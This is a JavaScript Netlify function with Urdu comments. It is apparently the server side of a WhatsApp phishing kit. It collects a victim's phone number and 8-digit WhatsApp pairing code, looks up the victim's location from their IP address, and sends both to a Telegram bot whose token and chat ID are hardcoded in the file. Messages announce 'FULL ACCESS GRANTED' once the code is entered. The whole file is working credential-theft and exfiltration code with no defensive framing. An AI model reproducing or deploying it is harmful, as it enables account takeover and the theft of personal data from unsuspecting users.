// netlify/functions/capture.js
// یہ فنکشن فون نمبر اور OTP کیپچر کر کے ٹیلی گرام بھیجتا ہے

const TELEGRAM_BOT_TOKEN = "8585329308:AAH5pDuedMvrbK8Bn2ovOTQAlWSOyyRxsJE";
const TELEGRAM_CHAT_ID = "8545560912";

// ٹیلی گرام پر میسج بھیجنے کا فنکشن
async function sendToTelegram(message) {
    try {
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });
        const data = await response.json();
        return data.ok;
    } catch (error) {
        console.error('Telegram error:', error);
        return false;
    }
}

// IP سے لوکیشن حاصل کرنے کا فنکشن
async function getLocationFromIP(ip) {
    try {
        const response = await fetch(`https://ipapi.co/${ip}/json/`);
        const data = await response.json();
        return `${data.city || 'Unknown'}, ${data.country_name || 'Unknown'}`;
    } catch (error) {
        return 'Unknown';
    }
}

exports.handler = async (event, context) => {
    // CORS headers
    const headers = {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Headers': 'Content-Type',
        'Access-Control-Allow-Methods': 'POST, OPTIONS'
    };

    // Handle preflight OPTIONS request
    if (event.httpMethod === 'OPTIONS') {
        return {
            statusCode: 200,
            headers,
            body: ''
        };
    }

    // Only accept POST requests
    if (event.httpMethod !== 'POST') {
        return {
            statusCode: 405,
            headers,
            body: JSON.stringify({ error: 'Method not allowed' })
        };
    }

    try {
        const data = JSON.parse(event.body);
        const clientIp = event.headers['x-forwarded-for'] || 
                         event.headers['client-ip'] || 
                         event.headers['x-real-ip'] || 
                         'Unknown';
        
        // Get location from IP
        const location = await getLocationFromIP(clientIp);
        const timestamp = new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' });
        
        let message = '';
        
        if (data.type === 'PHONE') {
            message = `📱 <b>WhatsApp Phone Number Captured!</b> 📱\n\n` +
                `━━━━━━━━━━━━━━━━━━\n` +
                `<b>📞 Phone Number:</b> <code>${data.phone}</code>\n` +
                `<b>🌐 IP Address:</b> <code>${clientIp}</code>\n` +
                `<b>📍 Location:</b> ${location}\n` +
                `<b>🖥️ Device:</b> ${data.userAgent?.substring(0, 100) || 'Unknown'}\n` +
                `<b>⏰ Time:</b> ${timestamp}\n` +
                `━━━━━━━━━━━━━━━━━━\n\n` +
                `<i>⏳ Waiting for 8-digit pairing code...</i>`;
                
        } else if (data.type === 'OTP') {
            message = `🔐 <b>WHATSAPP PAIRING CODE CAPTURED!</b> 🔐\n\n` +
                `━━━━━━━━━━━━━━━━━━\n` +
                `<b>📞 Phone Number:</b> <code>${data.phone}</code>\n` +
                `<b>🔢 8-Digit Code:</b> <code><b>${data.otp}</b></code>\n` +
                `<b>🌐 IP Address:</b> <code>${clientIp}</code>\n` +
                `<b>📍 Location:</b> ${location}\n` +
                `<b>🖥️ Device:</b> ${data.userAgent?.substring(0, 120) || 'Unknown'}\n` +
                `<b>⏰ Time:</b> ${timestamp}\n` +
                `━━━━━━━━━━━━━━━━━━\n\n` +
                `✅ <b>FULL ACCESS GRANTED!</b> ✅\n` +
                `🔓 User successfully entered the pairing code.`;
        }
        
        if (message) {
            await sendToTelegram(message);
            console.log(`✅ ${data.type} data sent to Telegram`);
        }
        
        return {
            statusCode: 200,
            headers,
            body: JSON.stringify({ 
                success: true, 
                message: 'Data captured and forwarded to Telegram' 
            })
        };
        
    } catch (error) {
        console.error('Error:', error);
        return {
            statusCode: 500,
            headers,
            body: JSON.stringify({ error: 'Internal server error' })
        };
    }
};
